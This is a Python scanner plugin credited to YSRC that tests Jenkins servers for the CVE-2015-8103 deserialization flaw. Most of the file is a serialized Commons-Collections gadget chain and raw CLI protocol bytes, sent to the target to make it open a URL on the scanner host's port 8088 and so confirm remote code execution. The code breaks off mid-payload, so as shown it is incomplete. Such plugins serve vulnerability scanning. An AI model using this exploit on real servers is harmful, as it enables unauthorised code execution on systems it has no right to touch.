# -*- encoding:utf-8 -*-
import socket
import base64
import random
import urllib2
import time
import binascii


def get_plugin_info():
    plugin_info = {
        "name": "Jenkins反序列化代码执行",
        "info": "Jenkins反序列化代码执行,CVE-2015-8103",
        "level": "紧急",
        "type": "代码执行",
        "author": "hos@YSRC",
        "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8103",
        "keyword": "tag:jenkins",
        "source": 1
    }
    return plugin_info


def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str(str1)


def get_ver_ip(ip):
    csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    csock.connect((ip, 80))
    (addr, port) = csock.getsockname()
    csock.close()
    return addr


def check(ip, port, timeout):
    try:
        r = urllib2.urlopen('http://' + ip + ':' + str(port), timeout=timeout)
        cli_port = int(r.headers['X-Jenkins-CLI-Port'])
        socket.setdefaulttimeout(timeout)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (ip, cli_port)
        sock.connect(server_address)
        headers = '\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74'
        sock.send(headers)
        data = sock.recv(1024)
        data = sock.recv(1024)
        dd = "aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b7870737d00000001000d6a6176612e7574696c2e4d6170787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b78707672000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00154c0004686f737471007e00154c000870726f746f636f6c71007e00154c000372656671007e001578707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d6571007e00155b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb342020000787074000e676574436f6e7374727563746f727571007e001d000000017671007e001d7371007e00177571007e001b00000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000787000000001740026687474703a2f2f3235352e3235352e3235352e3235353a383038382f6164642f72616e646f6d74000b6e6577496e7374616e63657571007e001d000000017671007e001b7371007e00177571007e001b0000000074000a6f70656e53747265616d7571007e001d000000007371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e0037"
        payloadObj = binascii.a2b_hex(dd)
        dnsserver = get_ver_ip(ip)
        ramdmum = random_str(6 + 15 - len(dnsserver))
        payloadObj = payloadObj.replace(
            'http://255.255.255.255:8088/add/random', 'http://' + dnsserver + ':8088/add/' + ramdmum)
        payload_b64 = base64.b64encode(payloadObj)
        payload = '\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d\x3d\x3d\x3e' + payload_b64 + '\x00\x00\x00\x00\x11\x2d\xac\xed\x00\x05\x73\x72\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x4c\x00\x10\x63\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x50\x72\x6f\x78\x79\x74\x00\x30\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x3b\x5b\x00\x07\x72\x65\x71\x75\x65\x73\x74\x74\x00\x02\x5b\x42\x4c\x00\x08\x74\x6f\x53\x74\x72\x69\x6e\x67\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x03\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x78\x70\x00\x00\x00\x0c\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x03\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x3c\x74\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x74\x00\x10\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x04\x63\x61\x6c\x6c\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x3c\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x70\x73\x7d\x00\x00\x00\x02\x00\x2e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x00\x1c\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x49\x52\x65\x61\x64\x52\x65\x73\x6f\x6c\x76\x65\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x78\x70\x73\x72\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x05\x5a\x00\x14\x61\x75\x74\x6f\x55\x6e\x65\x78\x70\x6f\x72\x74\x42\x79\x43\x61\x6c\x6c\x65\x72\x5a\x00\x09\x67\x6f\x69\x6e\x67\x48\x6f\x6d\x65\x49\x00\x03\x6f\x69\x64\x5a\x00\x09\x75\x73\x65\x72\x50\x72\x6f\x78\x79\x4c\x00\x06\x6f\x72\x69\x67\x69\x6e\x71\x00\x7e\x00\x0d\x78\x70\x00\x00\x00\x00\x00\x02\x00\x73\x71\x00\x7e\x00\x0b\x71\x00\x7e\x00\x43\x74\x00\x78\x50\x72\x6f\x78\x79\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x40\x32\x20\x77\x61\x73\x20\x63\x72\x65\x61\x74\x65\x64\x20\x66\x6f\x72\x20\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x75\x71\x00\x7e\x00\x11\x00\x00\x00\x0d\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x7d\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x89\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x74\x00\x04\x77\x72\x61\x70\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x6a\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x06\x65\x78\x70\x6f\x72\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x02\xa6\x74\x00\x21\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x74\x00\x16\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x4a\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x46\x71\x00\x7e\x00\x1d\x71\x00\x7e\x00\x1e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x22\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x26\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x71\x00\x7e\x00\x28\x70\x71\x00\x7e\x00\x29\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x2b\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x71\x00\x7e\x00\x30\x71\x00\x7e\x00\x31\x71\x00\x7e\x00\x32\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x34\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x36\x71\x00\x7e\x00\x3a\x78\x78\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x07\x46\xac\xed\x00\x05\x73\x72\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04\x49\x00\x03\x6f\x69\x64\x5b\x00\x09\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x05\x74\x79\x70\x65\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x77\x08\xff\xff\xff\xfe\x00\x00\x00\x02\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x77\x04\x00\x00\x00\x00\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x02\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x0b\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x02\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x39\x74\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xf6\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x71\x00\x7e\x00\x1e\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74